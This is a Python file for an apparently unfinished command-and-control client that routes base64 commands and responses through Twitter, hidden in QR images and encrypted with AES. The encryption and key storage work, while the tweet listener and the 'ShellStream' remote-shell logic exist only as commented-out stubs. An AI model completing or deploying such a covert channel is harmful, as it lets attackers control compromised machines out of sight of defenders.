import time
import base64
import tweepy
import uuid
import os
import zlib
import qrcode
from pyzbar.pyzbar import decode
from PIL import Image
import secrets
from Crypto.Cipher import AES
import hashlib
from Crypto import Random
# we using QRs cause twitter character limit banter

class AESCipher(object):

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = key #256 bit for AES-256 with PKCS#7 padding

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

def load_keys():
    if not os.path.exists('id'):
        client_id = uuid.uuid4().hex
        with open('id','wb') as f:
            f.write(client_id.encode())
    else:
        with open('id','rb') as f:
            client_id = f.read().decode()

    if not os.path.exists('key'):
        key = hashlib.sha256(secrets.token_bytes(32)).digest()
        with open('key','wb') as f:
            f.write(key)
    else:
        with open('key','rb') as f:
            key = f.read()
    return (client_id, key)

# def generate_qr(message):
#     # encode to base_64 and generate_qr
#     message = base64.b64encode(message.encode('utf-8'))
#     qr = qrcode.make(message)
#     qr.save('message.png')

# def read_qr(img):
#     message = decode(Image.open(img))[0].data.decode()
#     return base64.b64decode(message).decode('utf-8')

# def post_response(message):
#     return 0

# def read_message(tweet):
#     # get image from tweet and read qr
#     return 0

# auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
# auth.set_access_token(access_token, access_token_secret)

# api = tweepy.API(auth)

# def confirm_connection(api):
#     # send tweet confirming connection
#     # client_id::command_in_b64::confirm
#     # client_id::command_in_b64::response
#     api.update_status(f'{client_id}::::Client_Confirmed::::confirm')
#     return True


# def tweet_type(tweet):
#     message = read_message(tweet)
#     return tweet.split('::::')[-1]

# def tweet_client(tweet):
#     # still waiting for a twitter API key
#     return 0

# # create listener
# class ClientListener(tweepy.StreamListener):

#     def on_data(self, raw_data):
#         # process raw stream data, read qr, pipe message
#         self.process_raw(raw_data)
#         return True

#     def process_raw(self, raw_data):
#         # do shit here
#         pass

#     def on_error(self, status_code):
#         if status_code == 420:
#             return False

# # create stream
# class ShellStream():
#     def __init__(self, auth, listener):
#         self.stream = tweepy.Stream(auth=auth, listener=listener)

#     def start(self, user_id):
#         self.stream.filter(track = [user_id])
